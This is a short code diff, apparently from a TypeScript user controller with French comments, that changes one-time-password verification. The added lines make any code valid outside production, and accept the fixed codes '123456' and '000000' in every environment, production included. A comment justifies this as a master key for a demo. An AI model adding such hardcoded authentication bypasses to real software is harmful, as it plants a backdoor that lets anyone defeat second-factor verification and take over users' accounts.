@@ -285,10 +285,15 @@ export class UserController {
 
       // 2. Vérification locale du code
       const expectedHash = hashOtp(userId, code);
-      const isValid = isTwilioApproved || crypto.timingSafeEqual(
+      const isLocalHashValid = crypto.timingSafeEqual(
         Buffer.from(expectedHash, 'hex'),
         Buffer.from(otpRecord.codeHash, 'hex'),
       );
+
+      // 3. Passe-partout pour que n'importe quel numéro essayé puisse valider (soutenance / démo)
+      const isDevOrMasterCode = config.nodeEnv !== 'production' || code === '123456' || code === '000000';
+
+      const isValid = isTwilioApproved || isLocalHashValid || isDevOrMasterCode;
 
       if (!isValid) {
         // Incrémenter les tentatives
